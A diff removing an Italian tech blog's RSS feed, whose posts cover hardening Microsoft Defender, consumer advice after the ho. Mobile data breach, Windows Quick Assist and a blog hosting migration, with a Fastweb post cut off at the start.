@@ -1,1182 +1,736 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Gabriele Tips</title>
-    
-    
-    
-    <link>/</link>
-    <description>Recent content on Gabriele Tips</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>it-it</language>
-    <lastBuildDate>Sun, 20 Mar 2022 14:18:12 +0000</lastBuildDate>
-    
-	<atom:link href="/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Configurare correttamente Microsoft Defender</title>
-      <link>/post/configurare-correttamente-microsoft-defender/</link>
-      <pubDate>Sun, 20 Mar 2022 14:18:12 +0000</pubDate>
-      
-      <guid>/post/configurare-correttamente-microsoft-defender/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/defender-header.webp&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Windows include Microsoft Defender, un software antimalware integrato con il sistema in grado di proteggere il computer dalle minacce più recenti.&lt;/p&gt;
-&lt;p&gt;Negli ultimi anni Microsoft ha fatto enormi investimenti ed evoluzioni per alzare il livello di sicurezza di base di Defender. I primi tentativi lasciavano un po&amp;rsquo; a desiderare, tuttavia recentemente è arrivato a competere con le soluzioni di protezione più famose e in alcuni casi ne esce persino migliore.&lt;/p&gt;
-&lt;p&gt;Defender, nella sua configurazione di base, offre una protezione che si potrebbe considerare già sopra la media, tuttavia nasconde delle opzioni che possono essere attivate manualmente per incrementare di molto il livello di protezione e la sicurezza dell&amp;rsquo;intero sistema.&lt;/p&gt;
-&lt;p&gt;Alcune di queste opzioni si attivano dalle Impostazioni di Windows, altre invece sono un po&amp;rsquo; più nascoste e si attivano solamente tramite dei comandi PowerShell.&lt;/p&gt;
-&lt;p&gt;Fortunatamente, esiste un semplice strumento di terze parti che permette di configurare tutte queste opzioni da una comoda interfaccia.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Se si possiede una soluzione di protezione a pagamento con l&amp;rsquo;abbonamento scaduto, occorre disinstallarla immediatamente. Una protezione in abbonamento senza licenza è totalmente inefficace e vi fornisce una falsa sensazione di sicurezza!&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;configure-defender&#34;&gt;
-  Configure Defender
-  &lt;a href=&#34;#configure-defender&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Lo strumento si chiama Configure Defender e lo possiamo scaricare da questo repository GitHub. L&amp;rsquo;eseguibile da scaricare è &amp;ldquo;ConfigureDefender.exe&amp;rdquo;.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/AndyFul/ConfigureDefender&#34;&gt;https://github.com/AndyFul/ConfigureDefender&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;All&amp;rsquo;apertura veniamo accolti con una serie di pulsanti e selettori, raggruppati per sezioni.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/configure-defender.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;L&amp;rsquo;interfaccia principale di ConfigureDefender&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;È possibile andare ad impostare ogni singola voce, oppure usare delle configurazione pre-impostate ottimali.&lt;/p&gt;
-&lt;p&gt;Nello specifico, l&amp;rsquo;impostazione che consiglio di attivare è &lt;strong&gt;HIGH&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;L&amp;rsquo;impostazione HIGH attiva molte delle funzionalità di protezione contro gli exploit, attiva la Network Protection e molte delle regole di riduzione della superficie di attacco (ASR).&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Per attivarla è sufficiente cliccare su HIGH, attendere qualche secondo la comparsa della finestra di conferma e riavviare il computer.&lt;/strong&gt;&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/image-2.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Avviso di conferma di avvenuta configurazione&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;&lt;strong&gt;Fatto! In pochi minuti avete appena eseguito un aggiornamento veramente sostanziale a Microsoft Defender e alla sicurezza del vostro computer.&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Questa configurazione funziona solamente se non sono presenti altre soluzioni di protezione antivirus installate nel sistema (es. McAfee, Norton, etc&amp;hellip;).&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Ma cosa abbiamo fatto? Se siete curiosi, vediamo un po&amp;rsquo; nel dettaglio qualche impostazione.&lt;/p&gt;
-&lt;h2 id=&#34;funzionalità-antimalware-attivate-con-limpostazione-high&#34;&gt;
-  Funzionalità antimalware attivate con l&amp;rsquo;impostazione HIGH
-  &lt;a href=&#34;#funzionalit%c3%a0-antimalware-attivate-con-limpostazione-high&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;h4 id=&#34;pua-protection-on&#34;&gt;
-  PUA Protection [On]
-  &lt;a href=&#34;#pua-protection-on&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h4&gt;
-&lt;p&gt;Le applicazioni potenzialmente indesiderate (PUA) sono una categoria di software che può rallentare il funzionamento del computer, visualizzare annunci indesiderati o, nel peggiore dei casi, installare altro software senza il vostro consenso. Protezione imprescindibile.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;em&gt;Approfondimento tecnico:&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/detect-block-potentially-unwanted-apps-microsoft-defender-antivirus?view=o365-worldwide&#34;&gt;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/detect-block-potentially-unwanted-apps-microsoft-defender-antivirus?view=o365-worldwide&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id=&#34;cloud-protection-level-highest&#34;&gt;
-  Cloud Protection Level [Highest]
-  &lt;a href=&#34;#cloud-protection-level-highest&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h4&gt;
-&lt;p&gt;La protezione Cloud è la forma di protezione più avanzata presente nei moderni antivirus e antimalware. Usa la potenza di elaborazione del Cloud per determinare se un file è o meno una minaccia. Per farla breve, abbiamo girato la manopola un po&amp;rsquo; più aggressiva.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;em&gt;Approfondimento tecnico:&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/specify-cloud-protection-level-microsoft-defender-antivirus?view=o365-worldwide&#34;&gt;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/specify-cloud-protection-level-microsoft-defender-antivirus?view=o365-worldwide&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id=&#34;cloud-check-time-limit-20s&#34;&gt;
-  Cloud Check Time Limit [20s]
-  &lt;a href=&#34;#cloud-check-time-limit-20s&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h4&gt;
-&lt;p&gt;Quando Microsoft Defender trova un nuovo file sospetto, può impedire l&amp;rsquo;esecuzione del file mentre verifica sul servizio Cloud di protezione l&amp;rsquo;esito della scansione. Questa funzione si chiama BAFS (Block At First Sight).&lt;/p&gt;
-&lt;p&gt;Il periodo predefinito per il blocco del file è di 10 secondi, con questa impostazione l&amp;rsquo;abbiamo portato ad un massimo 20 secondi.&lt;/p&gt;
-&lt;p&gt;Terminati i 20 secondi, se Defender non ha ancora ricevuto una risposta, il file verrà sbloccato ed eseguito, ma la scansione continuerà comunque nel Cloud fino alla ricezione del risultato. Se dovesse risultare malevolo dopo i 20 secondi, il file verrà inserito in quarantena.&lt;/p&gt;
-&lt;p&gt;Nella maggior parte dei casi, il risultato della scansione Cloud avviene ben prima dei 20 secondi.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;em&gt;Approfondimento tecnico:&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-cloud-block-timeout-period-microsoft-defender-antivirus?view=o365-worldwide&#34;&gt;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-cloud-block-timeout-period-microsoft-defender-antivirus?view=o365-worldwide&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id=&#34;exploit-guard-attack-surface-reduction-asr&#34;&gt;
-  EXPLOIT GUARD Attack Surface Reduction (ASR)
-  &lt;a href=&#34;#exploit-guard-attack-surface-reduction-asr&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h4&gt;
-&lt;p&gt;Nella sezione EXPLOIT GUARD di Configure Defender vengono riportate tutte le impostazioni attivate per la riduzione della superficie di attacco.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/image-3.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Sezione relativa alle regole ASR&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Queste funzionalità di riduzione della superficie di attacco sono l&amp;rsquo;introduzione più interessante fatta da Microsoft negli ultimi anni. Le regole ASR mirano a chiudere o disattivare funzionalità di sistema pericolose che non vengono quasi mai usate dagli utenti, ma vengono spesso abusate dai malware per eseguire comandi malevoli e ottenere l&amp;rsquo;accesso al computer.&lt;/p&gt;
-&lt;p&gt;Per dirla breve, mette le sbarre a quella finestra che non usate mai e non sapete di avere, ma che fa tanto gola ai ladri.&lt;/p&gt;
-&lt;p&gt;Le regole ASR sono numerose e la loro spiegazione nel dettaglio può risultare complessa per chi non è molto pratico. Oltretutto, l&amp;rsquo;attivazione di una regola ASR può comportare dei falsi positivi, ovvero il blocco del funzionamento di una applicazione benigna.&lt;/p&gt;
-&lt;p&gt;La configurazione a HIGH attiva solamente le regole ASR che nel 99% dei casi non causano problemi nell&amp;rsquo;uso quotidiano, ma bloccano la stragrande maggioranza delle funzionalità di Windows usate dai malware. Per fare qualche esempio:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;impedisce alle macro di Office di fare chiamate di sistema pericolose&lt;/li&gt;
-&lt;li&gt;impedisce agli scripts di lanciare eseguibili scaricati da internet&lt;/li&gt;
-&lt;li&gt;impedisce l&amp;rsquo;esecuzione di scripts offuscati, spesso nascosti negli allegati e-mail&lt;/li&gt;
-&lt;li&gt;blocca l&amp;rsquo;esecuzione di processi non firmati da chiavette USB&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;La lista delle regole ASR è in costante aumento e verranno introdotte molte altre regole nel prossimo futuro.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;em&gt;Approfondimento tecnico:&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide&#34;&gt;https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;em&gt;Se volete leggere l&amp;rsquo;esperienza di un team tecnico che ha implementato le ASR in ambiente business corporate:&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://blog.palantir.com/microsoft-defender-attack-surface-reduction-recommendations-a5c7d41c3cf8&#34;&gt;https://blog.palantir.com/microsoft-defender-attack-surface-reduction-recommendations-a5c7d41c3cf8&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id=&#34;network-protection-on&#34;&gt;
-  Network Protection [ON]
-  &lt;a href=&#34;#network-protection-on&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h4&gt;
-&lt;p&gt;La Network Protection è abbastanza parlante e il suo funzionamento è molto semplice: impedisce di accedere a domini e IP pericolosi come phishing, scam e siti che ospitano malware.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/image-4.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Notifica di blocco&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h2 id=&#34;altre-impostazioni-avanzate-per-esperti&#34;&gt;
-  Altre impostazioni avanzate per esperti
-  &lt;a href=&#34;#altre-impostazioni-avanzate-per-esperti&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Come avrete notato, Microsoft Defender presenta molte altre funzioni che la configurazione HIGH non ha attivato. Sono funzioni avanzate, che possono generare falsi positivi se non vengono gestite correttamente.&lt;/p&gt;
-&lt;p&gt;Consiglio di approfondire il funzionamento solo se si è consapevoli e se sapete fare una ricerca tecnica su Google.&lt;/p&gt;
-&lt;p&gt;Per esempio la funzione di Controlled Folder Access permette di impedire ai ransomware di cifrare le cartelle dei documenti, ma la protezione è estremamente severa e il rischio di bloccare l&amp;rsquo;accesso ad applicazioni sicure è molto frequente. Attivatela solo se siete disposti a voler gestire qualche falso positivo da aggiungere alle esclusioni.&lt;/p&gt;
-&lt;p&gt;Volendo è possibile impostare Defender in modalità &amp;ldquo;paranoia&amp;rdquo;, bloccando tutti gli eseguibili che non hanno raggiunto un certo livello di prevalenza, età o non vengano aggiunti ad una lista sicura da parte di Microsoft.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/image-5.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;È una funzionalità estremamente utile per i computer che necessitano di un livello di protezione senza compromessi, ma il rischio di vedersi bloccato qualche aggiornamento di un software che usate solo voi e pochi altri è estremamente elevato.&lt;/p&gt;
-&lt;h2 id=&#34;testare-il-corretto-funzionamento&#34;&gt;
-  Testare il corretto funzionamento
-  &lt;a href=&#34;#testare-il-corretto-funzionamento&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;La configurazione proposta è pensata per un uso massivo comune e non dovrebbe causare falsi positivi nell&amp;rsquo;uso quotidiano. Nello specifico, l&amp;rsquo;unica parte che potrebbe causare qualche falso positivo in qualche caso specifico sono le regole ASR, ma mi vengono in mente solo scenari aziendali con software particolari tipo gestionali balordi mal progettati o macro incredibilmente complesse che operano ad un livello molto integrato con il sistema.&lt;/p&gt;
-&lt;p&gt;Per un uso domestico o piccolo ufficio, questa configurazione garantisce un aumento considerevole della sicurezza con un rischio pressoché nullo di falsi positivi.&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Furto dati ho. Mobile – Cosa rischio? Cosa fare?</title>
-      <link>/post/furto-dati-ho-mobile-cosa-rischio-cosa-fare/</link>
-      <pubDate>Mon, 04 Jan 2021 14:18:04 +0000</pubDate>
-      
-      <guid>/post/furto-dati-ho-mobile-cosa-rischio-cosa-fare/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/EqXOP0VXAAAsVwX.webp&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Probabilmente ne avrete sentito parlare, il 28 dicembre un utente anonimo su un forum del dark web affermava di aver violato l’operatore virtuale di Vodafone, “ho. Mobile”, rubando una notevole quantità di dati personali tra nome, cognome, numero di telefono, codice fiscale, e-mail, data e luogo di nascita, nazionalità e indirizzo e ultimo, ma non meno importante, il codice ICCID della SIM per effettuare la portabilità del numero ad un altro operatore.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/image.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Dopo le prime smentite da parte dell’operatore, oggi è arrivata la conferma della violazione con un comunicato ufficiale che trovate a questa pagina: &lt;a href=&#34;https://sendy.logotel.it/l/K64763I7GOqtsi7Z892fEC2xUQ/hFNWHsGh2r56vc8wtvPXfg/ctbpaBfqUDNAywODAY9cTg&#34;&gt;https://www.ho-mobile.it/comunicazione/&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;sono-utente-di-ho-mobile-mi-devo-preoccupare-cosa-rischio-&#34;&gt;
-  Sono utente di &amp;ldquo;ho. Mobile&amp;rdquo;, mi devo preoccupare? Cosa rischio? 📱
-  &lt;a href=&#34;#sono-utente-di-ho-mobile-mi-devo-preoccupare-cosa-rischio-&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;I dati che sono stati rubati sono una lista piuttosto dettagliata di informazioni personali, quindi i criminali ora hanno nome, cognome, indirizzo fisico, indirizzo mail, numero di telefono e codice fiscale di due milioni e mezzo di italiani. Questi dati possono essere utilizzati in futuro per attacchi di phishing mirati e furti di identità.&lt;/p&gt;
-&lt;h3 id=&#34;devo-fare-qualcosa-per-proteggermi-&#34;&gt;
-  Devo fare qualcosa per proteggermi? 🛡
-  &lt;a href=&#34;#devo-fare-qualcosa-per-proteggermi-&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;È importante prepararsi ad un possibile aumento ti attacchi costruiti sulla base dei dati personali rubati. Non fidatevi di SMS o di mail dove vi viene chiesto di reinserire le credenziali per l’accesso ai vostri account bancari, o di inserire il numero della carta di credito per sbloccare un pagamento. Nel dubbio, fate sempre una verifica chiamando la banca o il servizio da cui avete ricevuto il messaggio per informarli della comunicazione ricevuta e verificarne l&amp;rsquo;autenticità. Reperite sempre i numeri di telefono e gli indirizzi mail dai siti ufficiali.&lt;/p&gt;
-&lt;h3 id=&#34;non-ho-ancora-ricevuto-la-comunicazione-diretta-da-parte-di-ho-mobile-lho-scampata-&#34;&gt;
-  Non ho ancora ricevuto la comunicazione diretta da parte di &amp;ldquo;ho. Mobile&amp;rdquo;. L’ho scampata? 🖖
-  &lt;a href=&#34;#non-ho-ancora-ricevuto-la-comunicazione-diretta-da-parte-di-ho-mobile-lho-scampata-&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;No. Secondo le prime verifiche ufficiose, il database comprende circa due milioni e mezzo di utenti e sembrerebbe coinvolgere l’intera base di clienti di &amp;ldquo;ho. Mobile&amp;rdquo;. Il comunicato ufficiale è stato rilasciato solamente questa mattina e la comunicazione ai diretti interessati sta iniziando ad arrivare proprio in queste ore tramite SMS.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/1609767079.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h3 id=&#34;ho-letto-che-possono-rubarmi-il-conto-in-banca-è-vero-&#34;&gt;
-  Ho letto che possono rubarmi il conto in banca, è vero? 💸
-  &lt;a href=&#34;#ho-letto-che-possono-rubarmi-il-conto-in-banca-%c3%a8-vero-&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Estremamente improbabile, ma non impossibile.&lt;/p&gt;
-&lt;p&gt;Tra i dati rubati c’era anche un numero, chiamato ICCID. Questo numero è una specie di seriale univoco della SIM e con quello è possibile effettuare la migrazione del proprio numero di telefono ad un nuovo operatore. Questo numero in mano a malintenzionati apre le porte ad un attacco molto pericoloso: il SIM swapping. Questa tecnica fraudolenta permette ad un malintenzionato di richiedere la portabilità verso un altro operatore con lo scopo di dirottare gli SMS, usati oggi per l’autenticazione a due fattori di molte banche, verso una nuova SIM di sua proprietà.&lt;/p&gt;
-&lt;p&gt;Perché è improbabile che accada a noi a causa di questo breach? Perché questo tipo di attacco non può essere scalato velocemente su due milioni e mezzo di utenti, come potrebbe esserlo un furto di account di mail. Richiede l’intervento di un provider telefonico compiacente che effettua la portabilità senza verifica di un documento d’identità. È una tipologia di attacco mirato nei nostri confronti. Insomma, qualcuno che ha pescato da un mazzo di due milioni di carte, proprio la nostra.&lt;/p&gt;
-&lt;h3 id=&#34;per-quanto-riguarda-la-protezione-da-sim-swapping-posso-fare-qualcosa-&#34;&gt;
-  Per quanto riguarda la protezione da SIM swapping, posso fare qualcosa? 📴
-  &lt;a href=&#34;#per-quanto-riguarda-la-protezione-da-sim-swapping-posso-fare-qualcosa-&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Per arginare questa pratica illecita la soluzione più facile è quella di richiedere la sostituzione della SIM presso i punti vendita &amp;ldquo;ho. Mobile&amp;rdquo; autorizzati. &lt;a href=&#34;https://sendy.logotel.it/l/K64763I7GOqtsi7Z892fEC2xUQ/kUMXOcASt1oDsw8FbacaDw/ctbpaBfqUDNAywODAY9cTg&#34;&gt;https://www.ho-mobile.it/trova-negozio.html&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;non-mi-fido-più-di-ho-mobile-posso-cambiare-operatore-&#34;&gt;
-  Non mi fido più di &amp;ldquo;ho. Mobile&amp;rdquo;. Posso cambiare operatore? 📶
-  &lt;a href=&#34;#non-mi-fido-pi%c3%b9-di-ho-mobile-posso-cambiare-operatore-&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Sì, ma farlo ora è sconsigliato perché la procedura potrebbe non andare a buon fine. Stanno arrivando segnalazioni di utenti che stanno ricevendo esito negativo della loro richiesta di portabilità. È probabile che &amp;ldquo;ho. Mobile&amp;rdquo; abbia temporaneamente bloccato le portabilità verso altro operatore per arginare il problema del SIM swapping. Se non vi sentite sicuri, vi consiglio temporaneamente di cambiare SIM e quando la situazione si sarà calmata, procedere al cambio di operatore.&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Assistenza Rapida con Windows 10</title>
-      <link>/post/assistenza-rapida-con-windows-10/</link>
-      <pubDate>Fri, 01 May 2020 22:47:12 +0000</pubDate>
-      
-      <guid>/post/assistenza-rapida-con-windows-10/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/4dbc0be0702fce0f625b06e1c4d3d8f403405893.webp&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Windows 10 integra di base un comodo strumento per poter offrire assistenza remota, senza dover scaricare software di terze parti come i più famosi TeamViewer o AnyDesk.&lt;/p&gt;
-&lt;p&gt;Il software in questione si chiama proprio &lt;strong&gt;Assistenza Rapida&lt;/strong&gt;, ed è facilmente raggiungibile dal menu &lt;strong&gt;Start&lt;/strong&gt; nella cartella &lt;strong&gt;Accessori Windows&lt;/strong&gt; e cliccando su &lt;strong&gt;Assistenza rapida&lt;/strong&gt;, oppure cliccando il pulsante &lt;strong&gt;Start&lt;/strong&gt; e digitando &lt;strong&gt;Assistenza rapida&lt;/strong&gt; nella casella di ricerca.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/immagine-1.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Assistenza Rapida nel menu Start&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h3 id=&#34;come-funziona&#34;&gt;
-  Come funziona?
-  &lt;a href=&#34;#come-funziona&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Lo strumento è estremamente semplice: chi offre assistenza clicca su &lt;strong&gt;Aiuta un&amp;rsquo;altra persona&lt;/strong&gt;, generando così un codice da inviare alla persona da aiutare. Questa persona inserisce il codice nel campo &lt;strong&gt;Codice dall&amp;rsquo;assistente&lt;/strong&gt; e nel giro di pochi clic è possibile vedere il PC remoto o prenderne il controllo, a seconda dei permessi concessi.&lt;/p&gt;
-
-  &lt;figure class=&#34;center&#34; &gt;
-    &lt;img src=&#34;/images/immagine-2.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Finestra di Assistenza Rapida&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Personalmente l&amp;rsquo;ho utilizzato in diverse occasioni e l&amp;rsquo;ho trovato molto pratico, soprattutto per abbattere i tempi morti iniziali, spesso causati dal dover spiegare a persone non tecnicamente brillanti come scaricare correttamente il software di assistenza da internet.&lt;/p&gt;
-&lt;p&gt;Quante volte hanno &amp;ldquo;aperto Google&amp;rdquo; e alla fine non era Google?&lt;/p&gt;
-&lt;p&gt;Ecco, ci siamo capiti.&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Nuova casa per il blog</title>
-      <link>/post/nuova-casa-per-il-blog/</link>
-      <pubDate>Sun, 23 Feb 2020 14:22:51 +0000</pubDate>
-      
-      <guid>/post/nuova-casa-per-il-blog/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/plattform-hetzner-cloud.svg&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;In una sera di noia, ho trasferito questo blog e il dominio su una nuova infrastruttura per ottimizzare la gestione e i costi.&lt;/p&gt;
-&lt;p&gt;Come avevo scritto tempo fa, la macchina che ospitava il blog era una piccola EC2 t2.micro su AWS, mentre il dominio era registrato su Route 53.&lt;/p&gt;
-&lt;p&gt;Ben presto mi sono reso conto che AWS non è per nulla economico e i costi sono anche imprevendibili, perché ogni risorsa viene calcolata in modo preciso in base all&amp;rsquo;uso. Se si ha tanto traffico, si paga di più perché le risorse computazionali e di data transfer sono superiori. A questi livelli il delta è di un paio di euro al massimo, ma è comunque fastidioso per uno spazio di cazzeggio personale.&lt;/p&gt;
-&lt;p&gt;Con il setup su AWS, questo blog mi costava circa 14€ al mese, sommando EC2, transfer e zona DNS di Route53.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/2020-02-23-14_49_48-Billing-Management-Console.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Ho mantenuto questa situazione per tanto tempo, a causa della mia inestimabile pigrizia. Il mio obiettivo principale era quello di migrare Ghost ad un CMS statico, ma dopo mesi di ricerca non sono ancora riuscito a trovare un setup pratico che mi abbia convinto ad abbandonare Ghost.&lt;/p&gt;
-&lt;p&gt;Preso in un momento di buona produttività, ho abbandonato temporaneamente l&amp;rsquo;idea di staticizzare il blog e mi sono messo d&amp;rsquo;impegno almeno per migrarlo ad un servizio più economico: ho creato su &lt;a href=&#34;https://www.hetzner.com/cloud&#34;&gt;Hetzner&lt;/a&gt; un VPS, in pochi minuti ho tirato su un Ghost pulito, import del backup in JSON dal vecchio blog, import della cartella dei media, cambio dei DNS e in poco più di un&amp;rsquo;oretta avevo il blog up &amp;amp; running su una nuova macchina, il cui costo è di 3.65€ al mese.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/2020-02-23-14_51_51-Microsoft-Store.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Il passaggio successivo è stata la migrazione del dominio, per smettere di pagare 0.50$ al mese di zona DNS di Route53.&lt;/p&gt;
-&lt;p&gt;Avendo un TLD poco comune, sono andato su &lt;a href=&#34;https://tld-list.com&#34;&gt;tld-list.com&lt;/a&gt; e ho ordinato per transfer e renew più economici.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/2020-02-23-15_01_31-Cheapest-.tips-Domain-Registration--Renewal--Transfer-Prices-_-TLD-List.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Detto fatto, anche qui in meno di mezz&amp;rsquo;ora ho effettuato il transfer del dominio da Route53 a Porkbun 🐷. (tra l&amp;rsquo;altro è davvero figo porkbun, esperienza ottima!)&lt;/p&gt;
-&lt;p&gt;Al termine, ho eliminato tutti i servizi attivi su AWS. 👋🏻&lt;/p&gt;
-&lt;p&gt;Next step: staticizzare il blog e azzerare i costi, ma per quello vedremo più avanti&amp;hellip;&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Fastweb FTTH e Modem Libero</title>
-      <link>/post/fastweb-e-modem-libero/</link>
-      <pubDate>Wed, 03 Apr 2019 21:02:50 +0000</pubDate>
-      
-      <guid>/post/fastweb-e-modem-libero/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/thomas-jensen-602189-unsplash.webp&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;&lt;strong&gt;AGGIORNAMENTO del 01/03/2020&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Questo articolo è stato scritto diversi mesi fa. Potrebbe non essere più attuale e potrebbe consigliare procedure non più attuabili con i nuovi router e le nuove attivazioni Fastweb.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;ARTICOLO ORIGINALE&lt;/strong&gt;&lt;/p&gt;
